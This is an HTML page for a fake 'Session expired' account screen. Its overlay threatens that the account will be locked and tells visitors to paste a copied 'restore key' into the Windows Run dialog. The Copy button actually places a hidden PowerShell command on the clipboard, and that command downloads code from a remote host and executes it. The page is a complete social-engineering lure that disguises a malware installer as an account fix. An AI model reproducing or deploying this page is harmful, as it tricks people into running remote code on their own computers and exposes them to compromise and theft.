<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Account</title><style>body{font-family:system-ui,sans-serif;margin:0;color:#222;background:#fafafa}
header,footer{background:#203040;color:#fff;padding:12px 24px}nav a{color:#fff;margin-right:16px}
main{max-width:860px;margin:24px auto;padding:0 24px;background:#fff}
.overlay{position:fixed;inset:0;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center}
.box{max-width:520px;padding:32px;border:1px solid #ccc;border-radius:8px;box-shadow:0 4px 24px #0002}
.offscreen{position:absolute;left:-9999px;top:0;width:1px;height:1px}
pre{background:#f0f0f0;padding:12px;overflow:auto}</style></head>
<body>
<header><strong>Example Account</strong> <nav><a href="#">Profile</a></nav></header>
<div class="overlay" role="alertdialog" id="session"><div class="box">
<h2>Session expired</h2>
<p>Your account will be locked within 10 minutes.</p>
<p>Click Copy, open the Run dialog box and paste the restore key, then press Enter.</p>
<button type="button" data-clipboard-text="cmd /c start /min powershell -w h -c iex(irm restore.example.invalid)">Copy</button>
</div></div>

</body></html>
